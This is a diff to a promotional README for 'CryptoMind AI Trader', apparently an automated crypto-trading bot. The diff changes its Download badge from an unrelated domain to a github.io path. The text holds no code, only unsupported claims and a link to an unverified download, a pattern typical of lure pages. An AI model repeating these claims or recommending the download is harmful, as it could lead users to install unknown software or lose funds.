@@ -2,7 +2,7 @@
 
 🚀 **CryptoMind AI Trader** is an advanced AI-based bot built for automated crypto trading. It leverages real-time market data, predictive analytics, and adaptive neural networks to optimize trading decisions across major exchanges — all with zero manual input.
 
-[![Download CryptoMind AI](https://img.shields.io/badge/Download-CryptoMind_AI-blueviolet)](https://seomadjest.com/)
+[![Download CryptoMind AI](https://img.shields.io/badge/Download-CryptoMind_AI-blueviolet)](https://cryptomind-ai.github.io/.github/)
 
 ---
 
